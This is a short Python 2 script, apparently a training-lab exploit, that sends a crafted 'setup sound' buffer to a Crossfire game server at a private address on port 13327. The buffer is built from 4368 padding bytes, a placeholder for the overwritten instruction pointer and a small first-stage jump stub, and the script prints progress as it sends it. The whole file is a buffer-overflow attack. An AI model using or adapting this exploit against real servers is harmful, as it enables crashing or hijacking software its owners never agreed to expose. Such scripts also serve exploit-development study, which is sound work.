#!/usr/bin/python
import socket
import time

print "[*] Buffer Overflow Attack - for crossfire game"
time.sleep(1)
print "[*] Setup the server address and port number"
time.sleep(1)
host = "192.168.128.44"
port = 13327

print "[*] Creating the buffer payload"
time.sleep(1)
crash = "A" * 4368
eip = "B" * 4
#offset = "C" * 7
first_stage = "\x83\xC0\x0C\xFF\xE0\x90\x90"
mybuffer = "\x11(setup sound " + crash + eip + first_stage + "\x90\x00#"
print "[*] mybuffer size: " + str(len(mybuffer))
session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."

session.connect((host,port))
print session.recv(1024)

session.send(mybuffer)
session.close()

print "[*] Pyload sent!"
